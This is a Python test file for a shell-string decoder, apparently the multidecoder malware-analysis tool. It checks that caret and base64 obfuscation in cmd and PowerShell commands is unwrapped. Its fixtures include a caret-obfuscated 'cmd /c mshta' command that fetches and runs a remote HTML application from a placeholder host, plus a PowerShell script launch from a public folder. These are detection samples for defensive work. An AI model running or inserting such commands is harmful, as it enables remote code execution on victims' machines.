import regex as re

from multidecoder.analyzers.shell import CMD_RE, find_cmd_strings, find_powershell_strings, strip_carets
from multidecoder.hit import Hit

test = b'SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)'


def test_cmd_re_empty():
    assert not re.search(CMD_RE, b'')


def test_cmd_re_command():
    assert re.match(CMD_RE, b'cmd command')


def test_cmd_re_mixed_case():
    assert re.match(CMD_RE, b'CmD CoMMaNd')


def test_cmd_re_carets():
    assert re.match(CMD_RE, b'c^m^d c^omman^d')


def test_cmd_re_quotes():
    assert re.match(CMD_RE, b'cmd /c ""echo bee""')


def test_cmd_re_ex1():
    match = re.search(CMD_RE, test)
    assert match and test[match.start(): match.end()] == b'cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html'


def test_strip_carets_empty():
    assert strip_carets(b'') == b''


def test_strip_carets_no_caret():
    assert strip_carets(b'test') == b'test'


def test_strip_carets_caret():
    assert strip_carets(b'^') == b''


def test_strip_carets_escape_caret():
    assert strip_carets(b'^^') == b'^'


def test_strip_carets_trailing_caret():
    assert strip_carets(b'test^') == b'test'


def test_strip_carets_in_strnig():
    assert strip_carets(b'"^"') == b'"^"'


def test_strip_carets_line_continuation():
    assert strip_carets(b'start^\r\nend') == b'startend'


def test_strip_carets_unclosed_string():
    assert strip_carets(b'"test"" ^') == b'"test"" ^'


def test_find_cmd_strings():
    assert find_cmd_strings(test) == [
        Hit(value=b'cmd /c mshta http://some.url/x.html',
            start=13,
            end=55,
            obfuscation='unescape.shell.carets')
    ]


def test_find_powershell_strings_enc():
    ex = b'powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=='
    assert find_powershell_strings(ex) == [
        Hit(value=b'powershell echo bee',
            obfuscation='unescape.shell.carets/>powershell.base64',
            start=0,
            end=len(ex))
    ]


def test_find_powershell_for_loop():
    ex = b"for /f \"tokens=*\" %%a in ('powershell -Command \"hostname " \
         b"| %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
    assert find_powershell_strings(ex) == [
        Hit(value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
            obfuscation='',
            start=27,
            end=96)
    ]


def test_find_powershell_strings_invoke_expression():
    ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
    assert find_powershell_strings(ex) == [
        Hit(value=b'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1',
            obfuscation='',
            start=19,
            end=len(ex)-1)
    ]
